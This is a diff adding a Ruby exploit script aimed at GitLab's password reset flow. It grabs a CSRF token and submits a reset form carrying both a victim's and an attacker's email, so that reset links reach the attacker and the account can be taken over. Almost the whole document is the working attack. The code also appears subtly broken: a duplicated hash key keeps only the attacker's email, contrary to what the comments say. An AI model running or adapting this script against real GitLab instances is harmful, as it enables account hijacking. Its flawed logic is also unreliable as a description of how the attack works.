@@ -1,0 +1,71 @@
+require 'net/http'
+require 'uri'
+require 'openssl'
+require 'nokogiri'
+
+# Define a class for the GitLab password reset exploit
+class GitlabPasswordResetExploit
+    # Initialise with URL of the GitLab instance, victim's and attacker's email, and optionally a proxy
+  def initialize(url, victim, attacker, proxy = nil)
+    @url = url
+    @victim = victim
+    @attacker = attacker
+    @proxy = proxy
+    #Set up the HTTP client with proxy if provided, and configure SSL settings
+    @http = Net::HTTP.new(uri.host, uri.port, proxy&.host, proxy&.port)
+    @http.use_ssl = uri.scheme == 'https'
+    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE # Ignore SSL certificate verification
+  end
+
+  # Helper method to parse the URL
+  def uri
+    URI.parse(@url)
+  end
+
+  # Method to extract the CSRF token from the password reset page
+  def grab_token
+    # Perform a GET request to fetch the password reset page
+    response = @http.get("#{uri.path}/users/password/new")
+    # Use Nokogiri to parse the HTML response
+    doc = Nokogiri::HTML(response.body)
+    # Search for the CSRF token in the meta tags
+    csrf_token = doc.at('meta[name="csrf-token"]')['content']
+    if csrf_token
+      puts "The CSRF token is: #{csrf_token}"
+      return csrf_token
+    else
+      puts 'Error: CSRF token not found in the HTML content'
+      exit # Exit if no token is found
+    end
+  end
+
+  # Method to perform the password reset using the CSRF token
+  def reset_password(token)
+    # Set up the POST parameters, overwriting the victim's email with the attacker's email
+    params = {
+      'user[email]' => @victim, # This line will be overwritten
+      'authenticity_token' => token,
+      'user[email]' => @attacker  # Overwrites the victim's email
+    }
+    headers = { 'Content-Type' => 'application/x-www-form-urlencoded' }
+    # Perform a POST request  to submit the password reset form
+    response = @http.post("#{uri.path}/users/password", URI.encode_www_form(params), headers)
+    # Check the response to see if the password reset was likely successful
+    if response.body.include?("If your email address exists")
+      puts "Check if you have a new password reset email"
+    else
+      puts "Possibly not vulnerable"
+    end
+  end
+
+  # Runner method to exectue the token grabbing and password reset
+  def run
+    token = grab_token
+    reset_password(token)
+  end
+end
+
+# Example usage : Create an instance of the exploit and run it
+exploit = GitlabPasswordResetExploit.new('http://localhost', 'victim@example.com', 'attacker@example.com')
+exploit.run
+
